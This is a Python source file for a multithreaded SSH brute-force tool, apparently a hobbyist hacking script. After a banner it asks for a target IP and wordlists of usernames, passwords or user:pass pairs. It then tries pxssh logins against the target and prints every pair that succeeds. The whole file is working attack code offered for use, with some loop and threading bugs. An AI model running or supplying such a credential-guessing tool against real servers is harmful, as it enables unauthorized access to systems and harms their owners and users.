# © SSH Bruteforcer- Made by Yuval Simon. For www.bogan.cool

import time, threading, subprocess
from pexpect import pxssh
from colorama import Fore



class Main():
    def __init__(self):
        subprocess.call('clear', shell=True)

        print(f"""{Fore.RED}
  ██████  ██████ ██░ ██     ▄▄▄▄   ██▀███  █    ██▄▄▄█████▓█████  █████▒
▒██    ▒▒██    ▒▓██░ ██▒   ▓█████▄▓██ ▒ ██▒██  ▓██▓  ██▒ ▓▓█   ▀▓██   ▒ 
░ ▓██▄  ░ ▓██▄  ▒██▀▀██░   ▒██▒ ▄█▓██ ░▄█ ▓██  ▒██▒ ▓██░ ▒▒███  ▒████ ░ 
  ▒   ██▒ ▒   ██░▓█ ░██    ▒██░█▀ ▒██▀▀█▄ ▓▓█  ░██░ ▓██▓ ░▒▓█  ▄░▓█▒  ░ 
▒██████▒▒██████▒░▓█▒░██▓   ░▓█  ▀█░██▓ ▒██▒▒█████▓  ▒██▒ ░░▒████░▒█░    
▒ ▒▓▒ ▒ ▒ ▒▓▒ ▒ ░▒ ░░▒░▒   ░▒▓███▀░ ▒▓ ░▒▓░▒▓▒ ▒ ▒  ▒ ░░  ░░ ▒░ ░▒ ░    
░ ░▒  ░ ░ ░▒  ░ ░▒ ░▒░ ░   ▒░▒   ░  ░▒ ░ ▒░░▒░ ░ ░    ░    ░ ░  ░░      
░  ░  ░ ░  ░  ░  ░  ░░ ░    ░    ░  ░░   ░ ░░░ ░ ░  ░        ░   ░ ░    
      ░       ░  ░  ░  ░    ░        ░       ░               ░  ░       
                                 ░                                      
        """)

        self.checked = 0
        self.fails = 0
        print(f"{Fore.BLUE}1. Use a wordlist for both unames and passwords\n2. Use seperated unames list and password list:\n3. Use Uname:Pass File (Sperated by ':')\n")
        self.op = input(':')
        self.verbose = input('\n\n[CONSLOE] Print failes: ')
        self.thr = int(input('[CONSLOE] Please enter threads number (10-100): '))
        self.timeout = float(input('[CONSLOE] Timeout between each check (0.1-2): '))
        self.target = input('[CONSLOE] Please enter target ip: ')


    def connect(self, host, uname, password):
        self.checked += 1
        uname = uname.replace("\n", "")
        password = password.replace("\n", "")
        try:
            s = pxssh.pxssh()
            s.login(host, uname, password)
            print(f'{Fore.GREEN} Password Found {uname} {password}')
            
        except pxssh.ExceptionPxssh:
            self.fails += 1
            if self.verbose == 'y':
                print(f'{Fore.RED}Password inccorect! {uname}, {password}')


    def extract(self, path):
        users = []
        passwords = []
        for line in path:
            try:
                user = line.split(":")[0].replace('\n', '')
                password = line.split(":")[1].replace('\n', '')
                users.append(user)
                passwords.append(password)
            except:
                pass
        return users, passwords


    def start(self):
        threads = []
        if self.op == '1':
            subprocess.call('clear', shell=True)
            path = input('Wordlist path: ')
            f = open(path, 'r+', encoding='utf-8')

            for _ in range(self.thr):
                if self.checked < len(f.readlines()):

                    for i in open(path, 'r+', encoding='utf-8'):
                        time.sleep(self.timeout)
                        t = threading.Thread(target= self.connect, args=[self.target, i, i])
                        t.start()

                elif self.checked >= len(f.readlines()):
                    for t in threads:
                        t.join()


        elif self.op == '2':
            subprocess.call('clear', shell=True)
            path1 = input('User list path: ')
            path2 = input('Password list path: ')
            users = [user for user in open(path1, "r+", encoding='utf-8')]
            passwords = [password for password in open(path2, "r+", encoding='utf-8')]

            for _ in range(self.thr):
                if self.checked < len(users):

                    for i in range(0, len(users)):
                        time.sleep(self.timeout)
                        t = threading.Thread(target= self.connect, args=[self.target, users[i], passwords[i]])
                        t.start()

                elif self.checked >= len(users):
                    for t in threads:
                        t.join()

        elif self.op == '3':
            subprocess.call('clear', shell=True)
            path = input('UserPass file path: ')
            File = open(path, 'r+', encoding='utf-8')
            users, passwords = self.extract(File)

            for _ in range(self.thr):
                if self.checked < len(users):
                    
                    for i in range(0, len(users)):
                        time.sleep(self.timeout)
                        t = threading.Thread(target= self.connect, args=[self.target, users[i], passwords[i]])
                        t.start()

                elif self.checked >= len(users):
                    for t in threads:
                        t.join()
            